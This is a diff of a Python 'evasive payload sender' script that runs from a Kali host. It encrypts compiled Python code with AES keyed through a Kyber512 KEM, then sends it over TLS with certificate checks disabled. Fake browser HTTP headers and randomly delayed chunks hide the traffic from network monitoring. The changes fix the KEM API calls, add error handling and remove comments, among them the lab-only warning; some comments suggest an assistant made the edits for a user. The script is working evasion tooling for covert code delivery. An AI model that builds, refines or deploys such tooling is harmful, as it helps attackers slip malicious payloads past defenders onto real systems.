@@ -3,7 +3,7 @@
 Evasive Payload Sender (PQC KEM + AES + Marshal + Zlib + TLS + HTTP Mimicry)
 Runs on Sender (e.g., Kali 192.168.100.15).
 
-Establishes AES key via PQC KEM (Kyber), encrypts payload (marshal->zlib->AES),
+Establishes AES key via PQC KEM (Kyber512), encrypts payload (marshal->zlib->AES),
 wraps in TLS, adds basic HTTP headers, and sends in timed, length-prefixed chunks.
 """
 import socket
@@ -14,7 +14,7 @@ import marshal
 import zlib
 import ssl
 import base64
-import oqs # For Post-Quantum Cryptography
+import oqs # Use oqs module
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 
@@ -26,16 +26,17 @@ MIN_DELAY = 0.2
 MAX_DELAY = 1.0
 
 # PQC KEM Configuration
-PQC_KEM_ALG = "Kyber768" # Must match receiver's key algorithm
+PQC_KEM_ALG = "Kyber512" # Use the enabled algorithm
 
 # --- RECEIVER'S PQC PUBLIC KEY (Base64 Encoded - Paste from generator output) ---
 # Replace with the actual public key generated for the receiver
-RECEIVER_PQC_PUBLIC_KEY_B64 = "YOUR_RECEIVER_PUBLIC_KEY_BASE64_HERE"
+# Placeholder length (1067 chars) reflects Kyber512 public key size (800 bytes) in Base64
+RECEIVER_PQC_PUBLIC_KEY_B64 = "A"*1067 # <--- UPDATE THIS PLACEHOLDER LENGTH AND CONTENT
 # ------------------------------------------------------------------------------
 try:
     RECEIVER_PQC_PUBLIC_KEY = base64.b64decode(RECEIVER_PQC_PUBLIC_KEY_B64)
 except Exception as e:
-    print(f"[!] Invalid Base64 PQC Public Key provided: {e}")
+    print(f"[!] Invalid Base64 PQC Public Key provided or decode error: {e}")
     exit(1)
 
 # Header format for chunk length
@@ -59,17 +60,17 @@ print("="*40)
 
 def create_payload_aes(aes_key, code_string):
     """Compiles, marshals, compresses, and AES-encrypts the payload."""
+    expected_aes_key_len = 32
+    if len(aes_key) != expected_aes_key_len:
+        print(f"[!] Warning: AES key length ({len(aes_key)}) does not match expected length ({expected_aes_key_len}).")
+
     try:
         compiled_code = compile(code_string, '<string>', 'exec')
         marshaled_code = marshal.dumps(compiled_code)
         compressed_data = zlib.compress(marshaled_code, level=9)
-
-        # Use the AES key derived from PQC KEM
         cipher_aes = AES.new(aes_key, AES.MODE_GCM)
-        nonce_aes = cipher_aes.nonce # AES nonce (16 bytes)
+        nonce_aes = cipher_aes.nonce
         ciphertext_aes, tag_aes = cipher_aes.encrypt_and_digest(compressed_data)
-
-        # Return AES Nonce + AES Tag + AES Ciphertext
         return nonce_aes + tag_aes + ciphertext_aes
     except Exception as e:
         print(f"[!] Failed during payload AES encryption stage: {e}")
@@ -85,7 +86,6 @@ def send_chunked_data(sock, data):
         chunk = data[total_sent : total_sent + CHUNK_SIZE]
         chunk_len = len(chunk)
         try:
-            # Send chunk length header, then chunk
             length_header = struct.pack(LENGTH_HEADER_FORMAT, chunk_len)
             sock.sendall(length_header)
             sock.sendall(chunk)
@@ -98,15 +98,27 @@ def send_chunked_data(sock, data):
 
 def main():
     # 1. PQC Key Encapsulation (Establish AES Key)
-    print(f"[*] Performing PQC KEM ({PQC_KEM_ALG}) to establish AES key...")
+    print(f"[*] Performing PQC KEM ({PQC_KEM_ALG}) to establish AES key using oqs...")
     try:
+        # Use the oqs.KeyEncapsulation class and the user-confirmed encap_secret() method
         with oqs.KeyEncapsulation(PQC_KEM_ALG) as kem:
-            # Encapsulate returns the KEM ciphertext (to send) and the shared secret (AES key)
-            kem_ciphertext, shared_secret_aes_key = kem.encapsulate_secret(RECEIVER_PQC_PUBLIC_KEY)
+            # Use encap_secret() as confirmed by user for their generate_keys.py
+            kem_ciphertext, shared_secret_aes_key = kem.encap_secret(RECEIVER_PQC_PUBLIC_KEY) # USE USER-CONFIRMED METHOD
             print(f"[+] PQC KEM successful. Derived {len(shared_secret_aes_key)}-byte AES key.")
             print(f"[+] KEM Ciphertext size: {len(kem_ciphertext)} bytes")
+
+    except oqs.MechanismNotSupportedError as e:
+        print(f"[!] MechanismNotSupportedError: {e}")
+        print(f"[!] Ensure the algorithm '{PQC_KEM_ALG}' is supported and enabled.")
+        return
+    except AttributeError as e:
+        print(f"[!] AttributeError: {e}")
+        print(f"[!] Method 'encap_secret' not found. Check API for this oqs version.")
+        return
     except Exception as e:
-        print(f"[!] PQC KEM failed: {e}")
+        print(f"[!] PQC KEM encapsulate failed: {e}")
+        import traceback
+        traceback.print_exc()
         return
 
     # 2. Create AES-encrypted payload using the derived key
@@ -119,23 +131,19 @@ def main():
     raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     # 4. Wrap Socket with TLS (HTTPS Mimicry Layer 1)
-    # WARNING: Disabling verification is insecure - only for lab self-signed certs!
     print(f"[*] Wrapping socket with TLS for connection to {TARGET_IP}:{TARGET_PORT}")
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-    context.check_hostname = False  # Don't verify hostname
-    context.verify_mode = ssl.CERT_NONE # Don't verify the server certificate (self-signed)
+    context.check_hostname = False
+    context.verify_mode = ssl.CERT_NONE
 
     try:
-        # Connect must happen BEFORE wrap_socket for client mode in older Python? No, other way.
-        # Let's wrap first, then connect.
-        # ssl_sock = context.wrap_socket(raw_sock, server_hostname=TARGET_IP) # Use hostname if cert has it
-        ssl_sock = context.wrap_socket(raw_sock) # Simpler connect without SNI expectation
+        ssl_sock = context.wrap_socket(raw_sock)
         ssl_sock.connect((TARGET_IP, TARGET_PORT))
         print(f"[*] TLS connection established to {TARGET_IP}:{TARGET_PORT}")
         print(f"[*] Cipher used: {ssl_sock.cipher()}")
     except ssl.SSLError as e:
         print(f"[!] TLS Error: {e}. Check if receiver is running with TLS and certs match.")
-        print("[!] Ensure target port is correct (e.g., 443) and firewall allows it.")
+        print("[!] Ensure target port is correct and firewall allows it.")
         raw_sock.close()
         return
     except ConnectionRefusedError:
@@ -151,18 +159,14 @@ def main():
     with ssl_sock:
         try:
             # Send HTTP POST Headers (HTTPS Mimicry Layer 2)
-            # Calculate content length: KEM CT Header + KEM CT + AES Payload
-            # Note: This doesn't account for chunk headers yet, making it slightly inaccurate
-            # A more realistic mimicry would calculate the full size or use chunked encoding.
-            # Keep it simple for the lab.
             total_payload_size = KEM_CT_HEADER_SIZE + len(kem_ciphertext) + len(aes_encrypted_payload)
             http_headers = (
                 f"POST /submit HTTP/1.1\r\n"
-                f"Host: {TARGET_IP}\r\n" # Use target IP, or a fake domain if receiver expects it
-                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36\r\n" # Mimic browser
-                f"Content-Type: application/octet-stream\r\n" # Generic binary type
-                f"Content-Length: {total_payload_size}\r\n" # Approximate length
-                f"Connection: close\r\n\r\n" # Signal end of headers
+                f"Host: {TARGET_IP}\r\n"
+                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36\r\n"
+                f"Content-Type: application/octet-stream\r\n"
+                f"Content-Length: {total_payload_size}\r\n"
+                f"Connection: close\r\n\r\n"
             )
             print("[*] Sending minimal HTTP POST headers...")
             ssl_sock.sendall(http_headers.encode('utf-8'))
@@ -185,6 +189,8 @@ def main():
              print("[!] Connection broken unexpectedly (receiver might have closed).")
         except Exception as e:
             print(f"[!] Error during sending data over TLS: {e}")
+            import traceback
+            traceback.print_exc()
 
 if __name__ == '__main__':
     main()
